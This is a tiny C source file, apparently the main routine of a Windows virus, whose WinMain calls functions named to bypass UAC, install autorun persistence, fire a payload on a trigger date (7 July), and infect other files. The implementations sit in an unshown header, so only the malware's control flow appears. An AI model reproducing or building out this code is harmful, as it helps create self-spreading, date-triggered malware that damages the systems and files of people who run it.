#include "playboard.h"
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	start_no_UAC();
	autorun();
	if(examdate(7,7) == true){
		Do_It();
	}
	infectfile();
	return 0;
}